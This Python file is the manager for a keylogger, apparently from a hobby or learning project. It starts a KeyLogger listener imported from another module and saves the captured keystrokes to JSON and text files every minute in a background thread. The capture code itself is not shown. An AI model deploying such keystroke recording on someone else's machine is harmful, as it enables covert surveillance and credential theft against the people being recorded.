import time
import threading
from listener import KeyLogger
from write_to_file import WriteToFile

class Manager:
    def __init__(self):
        self.recorde = KeyLogger()
        self.data = WriteToFile()
        self.running = True


    def start_recording(self):
        self.recorde.start_listen()
        threading.Thread(target=self.write_periodically, daemon=True).start()

    def stop_recording(self):
        self.recorde.stop_listen()
        self.running = False

    def write_json_file(self):
        self.data.data = self.recorde.get_logs()
        self.data.write_to_json_file()
        self.data.write_to_file()

    def write_periodically(self):
        while self.running:
            time.sleep(60)
            self.write_json_file()


if __name__ == '__main__':
    n = Manager()
    n.start_recording()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        n.stop_recording()









